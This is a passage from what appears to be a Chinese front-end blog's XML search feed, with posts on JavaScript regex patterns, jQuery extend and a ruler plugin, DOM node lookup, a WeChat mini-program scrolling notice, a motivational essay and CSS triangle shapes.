//[&quot;R&quot;,&quot;D&quot;,&quot;and&quot;,&quot;C&quot;,&quot;po&quot;]</code></td></tr><tr><td>{n}</td><td>匹配模式中出现n次的内容<code>&quot;regular expression&quot;.match(/\b\w{3}/g);　　　//[&quot;reg&quot;,&quot;exp&quot;]</code></td></tr><tr><td>{min,max}</td><td>匹配模式中间出现次数在min和max之间的信息 ，如果省略了max，则意味着没有最多次数<code>&quot;goooooooooole&quot;.match(/o{2 , }/g);　　//[&quot;oo&quot;,&quot;oo&quot;,&quot;oo&quot;,&quot;oo&quot;,&quot;oo&quot;]</code></td></tr><tr><td>(pattern)</td><td>捕获模式<code>&quot;regular expression&quot;.match(/(r)/g , &#39;$1$1&#39; );　　　　 //rregularr exprression</code>，｀”regular expression”.match(/(r)(e)/g , “$2$1”);　　  //ergular expression｀</td></tr><tr><td>(?:pattern)</td><td>这不是捕获模式,不能用$1,$2等参数来记录匹配串<code>&quot;regular expression&quot;.match(/(？:r)(e)/g , &#39;$1$1&#39; );//eegular expeession</code></td></tr></tbody></table><p>　　<br>上面是《JavaScript面向对象编程指南》附录中30种正则匹配模式，可以分为直接量字符、字符类、复制、选择引用分组、以及指定匹配的位置。</p><p>其中有一些等价关系的存在、比如:</p><p>\w就相当于[A-Za-z0-9_],</p><p>\d相当于[0-9],</p><p>\D就相当于[^0-9]或[^\d]</p><p>记录这篇正则匹配模式，希望以后自己在用到有需要可以及时翻阅。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自制刻度尺插件-前端简易实现&quot;腾讯信用&quot;界面</title>
      <link href="/2017/08/12/js-rule20170812/"/>
      <url>/2017/08/12/js-rule20170812/</url>
      
        <content type="html"><![CDATA[<p>依据我现有的知识，在前端上”简易”的实现了腾讯信用的界面，同时自己自制了一个竖直的刻度尺插件，曲线的位置可以根据传入的数值动态的改变，这次主要也想总结一下关于jQuery中extend的方法，也是我们在写插件的时候常用的方法</p><h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170812102040413-1604886858.gif" alt=""></p><a id="more"></a><h1 id="jQuery中的extend方法"><a href="#jQuery中的extend方法" class="headerlink" title="jQuery中的extend方法"></a>jQuery中的extend方法</h1><p>这里我参考了前辈的博客，在前辈博客中可以进行更深一步的学习：</p><p>文档中给的解释是：jQuery.extend()函数主要是用于将一个或多个对象的内容合并到目标对象上，该函数可以将一个或多个对象的成员属性和方法复制到指定的对象上。</p><p>extend也是在我们写插件时常用的方法，</p><h2 id="1、扩展方法的原型"><a href="#1、扩展方法的原型" class="headerlink" title="1、扩展方法的原型"></a>1、扩展方法的原型</h2><p><code>$.extend(param,dparam...)</code>它的含义是将dparam合并到param中，</p><blockquote><p>需要注意如果多个对象具有该属性，则后者会覆盖前者的属性值，</p></blockquote><p>也就是说<code>var result = $.extend({},{name : &#39;JSoso&#39;,age：17}，{name:&quot;okaychen&quot;,sex:&quot;boy&quot;})</code></p><p>最后<code>result = {name:&quot;okaychen&quot;,age:17,sex:&quot;boy&quot;}</code></p><h2 id="2、只有一个参数的情况"><a href="#2、只有一个参数的情况" class="headerlink" title="2、只有一个参数的情况"></a>2、只有一个参数的情况</h2><p>只有一个参数时会将改方法合并到jQuery的全局对象中<br>比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.extend(</span><br><span class="line">　　&#123;<span class="attr">hello</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">'hello extend'</span>)&#125;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>最终会将hello方法添加到jQuery全局对象中去。</p><h2 id="3、带布尔值的情况"><a href="#3、带布尔值的情况" class="headerlink" title="3、带布尔值的情况"></a>3、带布尔值的情况</h2><p>jQuery中的extend还有一种重载原型</p><p>语法：<code>$.extend(boolean,dest,src1,src2...)</code></p><p>第一个布尔值参数表示是否使用深度拷贝，默认为false（可以明确指定为true，但是不能明确指明为false）</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170812124116163-1529701924.png" alt=""></p><p>那么什么是深度拷贝呢？其实不难理解，深度拷贝就是该”属性对象”的”属性”也会被拷贝的目标对象中 </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = $.extend(<span class="literal">true</span>, &#123;&#125;</span><br><span class="line">　　&#123;<span class="attr">name</span>:<span class="string">'JSoso'</span>,<span class="attr">abstract</span>: &#123;age：<span class="number">17</span>,<span class="attr">country</span>:<span class="string">'USA'</span>&#125;&#125;,</span><br><span class="line">　　&#123;last：<span class="string">"Amor"</span>,<span class="attr">abstract</span>: &#123;<span class="attr">state</span>:<span class="string">'student'</span>,<span class="attr">country</span>:<span class="string">'China'</span>&#125;&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>那么合并后的结果就是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = &#123;</span><br><span class="line">　　name:<span class="string">'JSoso'</span>,</span><br><span class="line">　　last:<span class="string">'Amor'</span>,</span><br><span class="line">　　abstract:&#123;<span class="attr">age</span>:<span class="number">17</span>,<span class="attr">state</span>:<span class="string">'student'</span>,<span class="attr">country</span>:<span class="string">'China'</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如果参数是false，结果会是神马呢？</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = &#123;</span><br><span class="line">　　name : <span class="string">"JSoso"</span>,</span><br><span class="line">　　last : <span class="string">"Amor"</span>,</span><br><span class="line">　　abstract:&#123;<span class="attr">state</span>:<span class="string">"student"</span>,<span class="attr">country</span>:<span class="string">"China"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会看到第一个abstract内的属性并没有被拷贝，因为没有执行深度拷贝，所以abstract会被后一个覆盖掉了。</p><p>关于extend拷贝的方法我总结了上面三点，其实还有好多学问，需要我们去发掘。</p><h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><p>我看目前网上几乎都是水平的可滑动的刻度尺插件，几乎没有竖直的插件，其实也大同小异。因为做这个东西的需要，所以我需要做一个竖直的刻度尺</p><p>我做这个插件的第一步是先用HTML+ CSS静态的写出大致的效果（这样的同时我觉得我也直观的构思了这个东西的大致架构），比如先0~10做出来，然后计算好间距，然后在后面做文章。</p><p>当我们清晰了这个刻度尺的架构之后，需要做的就是用<code>append</code>的方法（这里我用的jQuery）插入到指定的位置就可以了（因为这个时候你的刻度尺css代码基本已经完成）。</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170812110926992-1009967010.png" alt=""> </p><p>然后我们需要处理中间标志（即曲线的初始位置）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstRand = <span class="literal">true</span>；</span><br><span class="line"><span class="keyword">if</span> (firstRand) &#123;</span><br><span class="line">   pTop = $(<span class="string">".rulerPointer"</span>).position().bottom;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rulerLNo = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> z = <span class="number">0</span>; z &lt; setLen; z++) &#123;</span><br><span class="line">       <span class="keyword">if</span> (z * setHeight &gt; pTop) &#123;</span><br><span class="line">           limitTop = pTop - z * setHeight;</span><br><span class="line">           rulerLNo = z;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改变曲线的位置&lt;和传入的数值相对应&gt;</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (param.value &amp;&amp; param.value &gt;= param.minUnit &amp;&amp; param.value &lt;= param.max) &#123;</span><br><span class="line">     $(<span class="string">" .rulerPointer"</span>).css(<span class="string">"bottom"</span>, (param.value / param.minUnit) * <span class="number">10</span> * param.mult)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $(<span class="string">" .rulerPointer"</span>).css(<span class="string">"bottom"</span>, <span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们用each遍历的方法给刻度尺标上刻度值（这里idx就是索引值，ele表示获取遍历的每一个dom对象）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">"#"</span> + param.wrapperId + <span class="string">" .sizeNo"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">idx, ele</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= rulerLNo &amp;&amp; idx &lt; setLen) &#123;</span><br><span class="line">          $(ele).html((idx - rulerLNo) * param.minUnit *param.unitSet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>到这里我们的刻度尺的代码已经完成（只展示了部分代码）</p><h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>当我们完成插件的封装，我们只需要创建一个实例化的对象就可以了。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> measureRuler = <span class="keyword">new</span> MeasureRuler(&#123;</span><br><span class="line">    wrapperId:<span class="string">"rulerWrapper"</span>,           　　　　 <span class="comment">//刻度尺容器的ID</span></span><br><span class="line">    max:<span class="number">110</span>,                                    <span class="comment">//最大刻度</span></span><br><span class="line">    minUnit:<span class="number">1</span>,                                  <span class="comment">//最小刻度</span></span><br><span class="line">    unitset:<span class="number">10</span>,                                 <span class="comment">//刻度尺单元长度</span></span><br><span class="line">    value:<span class="number">60</span>,                                   <span class="comment">//初始化值，曲线的初始位置</span></span><br><span class="line">    mult:<span class="number">1</span>                                      <span class="comment">//刻度尺倍数，默认为10px</span></span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript快速查找节点</title>
      <link href="/2017/08/11/js-findNode20170811/"/>
      <url>/2017/08/11/js-findNode20170811/</url>
      
        <content type="html"><![CDATA[<p>我们在实际的开发中，经常要获取页面中某个html元素，动态更新元素的样式、内容属性等。</p><img src="http://images2017.cnblogs.com/blog/1140602/201708/1140602-20170811173058398-1140296284.gif" alt=""><p>我们已经知道在JavaScript中提供下面的方法获取子、父、兄节点的方法：</p><h1 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h1><p>1.通过父节点获取子节点：</p><ul><li>获取已知父节点的第一个子节点:<code>parentObj.firstChild</code></li><li>获取已知父节点的最后一个子节点:<code>parentObj.lastChild</code></li><li>获取已知父节点的子节点数组(这里我在IE 7中获取的是所有直接的子节点):<code>parentObj.childNodes</code>　　</li><li>获取已知节点的直接子节点数组（在IE7中和childNodes效果一样）:<code>parentObj.children</code>  </li><li>返回已知子节点中类型为指定值的子节点数组:<code>parentObj.getElementsByTagName(tagName)</code>  </li></ul><p>2.通过临近节点获取兄弟节点：</p><ul><li>获取已知节点的前一个兄弟节点:<code>neighbourNode.previousSibing</code></li><li>获取已知节点的下一个兄弟节点:<code>neighbourNode.nextSibing</code></li></ul><p>3.通过子节点获取父节点：</p><ul><li>获取已知节点的父节点:<code>childNode.parentNode</code></li></ul><p>上面的方法基本都是可以递归是使用的，但并不是最优</p><a id="more"></a><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>在扩展之前，我们需要知道一些关于节点基础的知识：Dom节点中，每个节点都拥有不同的类型</p><p>W3C规范中常用的Dom节点的类型有以下几种</p><table><thead><tr><th>节点类型</th><th>说明</th><th>值</th></tr></thead><tbody><tr><td>元素节点</td><td>每一个HTML标签都是一个元素节点</td><td>１</td></tr><tr><td>属性节点</td><td>元素节点（HTML标签）的属性，如id，class，name等</td><td>２</td></tr><tr><td>文本节点</td><td>元素节点或属性节点中的文本内容</td><td>３</td></tr><tr><td>注释节点</td><td>文档的注释</td><td>８</td></tr><tr><td>文档节点</td><td>表示整个文档（Dom树的根节点，即document）</td><td>９</td></tr></tbody></table><p>关于节点的名称，不同类型的节点对应不同的名称</p><table><thead><tr><th>节点类型</th><th>说明</th></tr></thead><tbody><tr><td>元素节点</td><td>HTML的名称（大写）</td></tr><tr><td>属性节点</td><td>属性的名称</td></tr><tr><td>文本节点</td><td>它的值永远的都#text</td></tr><tr><td>文档节点</td><td>它的值永远都是#document</td></tr></tbody></table><p>可以分别通过nodeType（节点类型），nodeName（节点名称），以及nodeValue（节点值）分别返回节点的类型（比如元素节点返回1，属性节点返回2）、节点名称以及节点值；</p><h1 id="JS获取兄弟节点的两种方法"><a href="#JS获取兄弟节点的两种方法" class="headerlink" title="JS获取兄弟节点的两种方法"></a>JS获取兄弟节点的两种方法</h1><p>方法一：通过父元素的子元素先找到含自己在内的“兄弟元素”，然后在剔除自己</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sibling</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">var</span> a = [];</span><br><span class="line">   <span class="keyword">var</span> b = elem.parentNode.children;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span> ; i &lt; b.length ; i++)&#123;</span><br><span class="line">     <span class="keyword">if</span>(b[i] !== elem)   a.push(b[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二：jQuery中实现方法，先通过查找元素的第一个子元素，然后在不断往下找下一个紧邻元素，判断并剔除自己。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">siblings:<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> JQuery.sibling(elem.parentNode.firstNode,elem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JQuery.sibling = <span class="function"><span class="keyword">function</span>(<span class="params">n,elem</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> r = [];</span><br><span class="line">    <span class="keyword">for</span> (;n;n= n.nextSibling)&#123;</span><br><span class="line">    <span class="keyword">if</span>(n.nodeType == <span class="number">1</span> &amp;&amp; （！elem ||  elem  != elem))</span><br><span class="line">    r.push(n);</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在jQuery 1.2多的版本中都可以找到这段代码，我看的jQuery1.2.3的版本，在1800行可以找到这段代码:</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170811160458570-1191181173.png" alt=""></p><p>把这个方法转化为独立可用的函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fucntion sibling(elem)&#123;</span><br><span class="line">    <span class="keyword">var</span> r = [];</span><br><span class="line">    <span class="keyword">var</span> n = elem.parentNode.firstChild;</span><br><span class="line">    <span class="keyword">for</span>(;n;n = n.nextSibling) &#123;</span><br><span class="line">        <span class="keyword">if</span>(n.nodeType === <span class="number">1</span> &amp;&amp; n !== elem) &#123;</span><br><span class="line">            r.push(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然通过这种方法查找特定节点的兄弟元素，可以很方便的避免的使用递归的冗余。</p><h1 id="获取所有元素子节点"><a href="#获取所有元素子节点" class="headerlink" title="获取所有元素子节点"></a>获取所有元素子节点</h1><p>在JavaScript中，可以通过children来获取所有的子节点（只返回HTML中，甚至不返回子节点），几乎得到了所有浏览器的支持，但是在Firefox有的版本中不支持。注意：在IE中，children包含注释节点</p><p>所以因为特殊情况的存在，有时候我们需要只获取元素节点，这样我们就可以通过nodeType属性来进行筛选，用上面的知识：nodeType == 1的节点为元素节点。</p><p>下面，自定义一个函数来获取所有的元素子节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getChildNodes = <span class="function"><span class="keyword">function</span>(<span class="params">elem</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> childArr = elem.children || elem.childNodes,  </span><br><span class="line">        childArrTem = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span> ; i &lt; childArr.length; i ++ )  &#123;</span><br><span class="line">            <span class="keyword">if</span> (childArr[i].nodeType == <span class="number">1</span>)&#123;</span><br><span class="line">            childArrTem.push(childArr[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> childArrTem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取所有的父节点"><a href="#获取所有的父节点" class="headerlink" title="获取所有的父节点"></a>获取所有的父节点</h1><p>同样的，我们可以获取当前节点所有的父节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParents</span> （<span class="title">elem</span>）</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parents = [];</span><br><span class="line">    <span class="keyword">while</span>(elem.parentNode)&#123;</span><br><span class="line">        parents.push(elem.parentNode)</span><br><span class="line">        elem = elem.parentNode;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> parents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们可以接受一个dom节点，最终会获取到document对象，如果只要获取到最上层是body，可以把while里的判断改为：<code>while（elem.parentNode &amp;&amp; elem.parentNode.tagName == &#39;BODY&#39;</code></p><p>依据JavaScript中的提供的获取节点的方法和相关的知识，我们可以写出很多封装的方法，尝试一下，你可以写出多少种获取节点的方法呢？</p><p>当我们写出了一些操作节点的封装之后在去看jQuery中Dom操作节点方法的源码会轻松很多呢。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序-滚动消息通知</title>
      <link href="/2017/08/02/wx-miniProgram20170802/"/>
      <url>/2017/08/02/wx-miniProgram20170802/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面：　"></a>写在前面：　</h1><p>这次我主要想总结一下微信小程序实现上下滚动消息提醒，主要是利用swiper组件来实现，swiper组件在小程序中是滑块视图容器。</p><h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170802200717553-132653419.gif" alt=""><a id="more"></a><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>我们通过vertical属性（默认为false,实现默认左右滚动）设置为true来实现上下滚动。（需要注意的是：只要你的swiper存在vertical属性，无论你给值为true或者false或者不设参数值，都将实现上下滚动）</p><p>wxml</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">swiper</span> <span class="attr">class</span>=<span class="string">"swiper_container"</span> <span class="attr">vertical</span>=<span class="string">"true"</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">circular</span>=<span class="string">"true"</span> <span class="attr">interval</span>=<span class="string">"2000"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">"&#123;&#123;msgList&#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">"/pages/index/index?title=&#123;&#123;item.url&#125;&#125;"</span> <span class="attr">open-type</span>=<span class="string">"navigate"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"swiper_item"</span>&gt;</span>&#123;&#123;item.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>wxss</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.swiper_container</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">55</span>rpx;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80vw</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.swiper_item</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">25</span>rpx;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app = getApp()</span><br><span class="line">Page(&#123;</span><br><span class="line">data: &#123;&#125;,</span><br><span class="line">onLoad(e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.title)</span><br><span class="line">    <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">    msgList: [</span><br><span class="line">            &#123; <span class="attr">url</span>: <span class="string">"url"</span>, <span class="attr">title</span>: <span class="string">"公告：多地首套房贷利率上浮 热点城市渐迎零折扣时代"</span> &#125;,</span><br><span class="line">            &#123; <span class="attr">url</span>: <span class="string">"url"</span>, <span class="attr">title</span>: <span class="string">"公告：悦如公寓三周年生日趴邀你免费吃喝欢唱"</span> &#125;,</span><br><span class="line">            &#123; <span class="attr">url</span>: <span class="string">"url"</span>, <span class="attr">title</span>: <span class="string">"公告：你想和一群有志青年一起过生日嘛？"</span> &#125;]</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>数据放在了setData函数中，setData函数的主要作用是将数据从逻辑层发送到视图层，但是需要避免单次设置大量的数据。</p>]]></content>
      
      
      <categories>
          
          <category> 小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你愿不愿意做一个一异类，异于常人，出类拔萃</title>
      <link href="/2017/07/13/life-aboutlife20170713/"/>
      <url>/2017/07/13/life-aboutlife20170713/</url>
      
        <content type="html"><![CDATA[<p>看大家都自愿报了老师移动互联的暑期培训，但是却拿不出兴趣和势头，那大家和我都失去了参与这次培训的意义。</p><p>我参与这次培训是想对自己这近一年前端知识做一个总结和梳理，你说你学会了很多东西，其实不然，我觉得目前为止对我们来说有三样东西你能告诉自己你学到了些东西：</p><p>一是抓住参加比赛的机会，自己动手去做；</p><p>二是要抓住做项目的机会；</p><p>三是能把学到的东西讲给别人。</p><a id="more"></a><p>所以我积极参与这次培训，也跟组长说我希望我能负责大部分内容。</p><p>记得选择自己喜欢的行业，做一件自己喜欢的事：</p><p>我这学期二月份开始做前端项目，中间东西一直在做，给公司做过不少项目，帮学姐改毕设，包括下一版校团委的官网前端，参加比赛的东西我都是亲手做。</p><p>之前有一个同学在群里说暑假去做兼职，我说还是多花些时间充实自己，多学些东西，在该学习的时间就要潜心修炼，牛奶和面包一定会有的：</p><p>错误和兼容性问题积累的越多，做项目测试阶段出现的问题就越少，这是你们无论如何在学校课堂上学不到的知识。</p><p>读完了格拉德威尔的《异类》，第一章讲了一个效应叫做马太效应，“一个人从出生比不是就是一无所有，从出生开始我们就拥有了一定的资助和禀赋，能在众王面前站立人，好像完全凭借他的能力，事实上，总有潜在的优势，非凡的机遇和传统的文化令他们获益”说明成功是各个方面的因素。第三章讲了一个定律叫一万小时定律，但是很多人都没有走完这一万小时，遇到挫折、批评、误解就轻言放弃。</p><p>希望大家选择好自己的未来，走好这一万小时。</p><p>“大学，在于提升自己的稀缺性” 这是上次弄潮儿老师说过的话，最后希望你们选择好自己的未来，去做自己感兴趣的事</p><p>所有的结局都已写好，所有的明天都已启程，却忽然忘了那是一个怎么样的开始。</p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css绘制常见的几何图形</title>
      <link href="/2017/07/12/css-shape20170712/"/>
      <url>/2017/07/12/css-shape20170712/</url>
      
        <content type="html"><![CDATA[<p>　　<br>前言：终于我的大一生活结束了，迎来了愉快的暑假，大家都开始了各自的忙碌。一直忙着一些项目的事情，终于决定今天要更新一篇博客了，对上一阶段的学习做简单的总结。</p><p>这次我主要总结一下用css绘制各种形状的技巧，同时要结合before、after伪元素和定位做出一些效果。</p><a id="more"></a><h1 id="Triangle-Up-向上的三角形"><a href="#Triangle-Up-向上的三角形" class="headerlink" title="Triangle Up(向上的三角形)"></a>Triangle Up(向上的三角形)</h1><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712200525197-109164423.png" alt=""></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-id">#triangle-up</span>&#123;</span><br><span class="line">　  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-left</span>:<span class="number">50px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">50px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">70px</span> solid <span class="number">#81cfa2</span>;</span><br><span class="line">&#125;</span><br><span class="line">```　　　</span><br><span class="line"># <span class="selector-tag">Triangle</span> <span class="selector-tag">Down</span>(向下的三角形)</span><br><span class="line"></span><br><span class="line">![](https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712201030759-1254012555.png)</span><br><span class="line"></span><br><span class="line">```<span class="selector-tag">css</span></span><br><span class="line"><span class="selector-id">#triangle-down</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">50px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">50px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">70px</span> solid <span class="number">#81cfa2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Triangle-Left-向左的三角形"><a href="#Triangle-Left-向左的三角形" class="headerlink" title="Triangle Left(向左的三角形)"></a>Triangle Left(向左的三角形)</h1><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712202214697-1522033866.png" alt=""></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#triangle-left</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">70px</span> solid <span class="number">#81cfa2</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">50px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-bottom</span>:<span class="number">50px</span> solid transparent;</span><br><span class="line">&#125;</span><br><span class="line">```　</span><br><span class="line"></span><br><span class="line"># <span class="selector-tag">Triangle</span> <span class="selector-tag">TopRight</span>(向右上的三角形)</span><br><span class="line"></span><br><span class="line">![](https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712202738290-1515615810.png) </span><br><span class="line"></span><br><span class="line">```<span class="selector-tag">css</span></span><br><span class="line"><span class="selector-id">#triangle-topright</span> &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">border-top</span>: <span class="number">100px</span> solid <span class="number">#81cfa2</span>;</span><br><span class="line">      <span class="attribute">border-left</span>: <span class="number">100px</span> solid transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三角形实现比较简单，同理可以得到一些其他的三角形，绘制三角形主要是另宽高都为0，然后利用transparent设置其他部分透明。<br>但是要学会在自己的项目中结合before和after伪元素以及定位做出一些组合效果，比如我正在做的Oppo社区的一个练习（我这个做Gif的软件有些瑕疵）</p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712215333415-70177704.gif" alt=""/><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712205235868-1080969159.png" alt="">　　</p><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712204354900-316319978.png" alt=""><br>这里我贴上导航栏处绘制三角形的代码</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.search</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">border-bottom-color</span>: <span class="number">#000</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">11px</span>;</span><br><span class="line">&#125;</span><br><span 